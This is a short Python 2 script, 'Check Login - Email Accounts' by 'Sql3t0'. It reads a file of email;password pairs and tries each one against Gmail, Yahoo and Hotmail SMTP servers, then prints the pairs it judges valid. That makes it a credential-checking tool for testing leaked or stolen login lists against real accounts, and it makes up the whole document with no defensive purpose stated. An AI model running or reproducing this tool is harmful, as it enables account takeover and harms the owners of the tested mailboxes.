#!/usr/bin/python
# Check Login - Email Accounts
# By Sql3t0
#
# style from lines in file to read
# e.g:
# 	  filename.txt
#		email1@gmail.com;senha1
#		email1@yahoo.com;senha2
#		continue...
#
# Usage: python scriptname.py filename.txt


import sys
import smtplib
smtp_servers = ['smtp.gmail.com:587','smtp.mail.yahoo.com:587','smtp.live.com:587']

for l in open(sys.argv[1]):
	dataLogin = l.replace('\n','').split(';')  
	mail   = dataLogin[0] 
	passwd = dataLogin[1]
	if ("@gmail." in mail):
		s = smtplib.SMTP(smtp_servers[0])
	elif ("@yahoo." in mail):
		s = smtplib.SMTP(smtp_servers[1])
	elif ("@hotmail." in mail) or ("@live." in mail):
		s = smtplib.SMTP(smtp_servers[2])	
	else:
		print 'Unlisted mail server !'
	

	s.starttls()
	#s.set_debuglevel(1) 
	try:
		s.login(mail,passwd)
	except smtplib.SMTPAuthenticationError as e:
		if e[0] == 534:
			print "[+] Login OK !"
			print "[+] Login: %s ; Passwd: %s"%(mail,passwd)
		elif e[0] == 535:
			sys.stdout.write('\r[-] Erro : Mail[%s] and Password[%s] not accepted !'%(mail,passwd))
		else:
			print "Undetermined Error !"

	s.quit()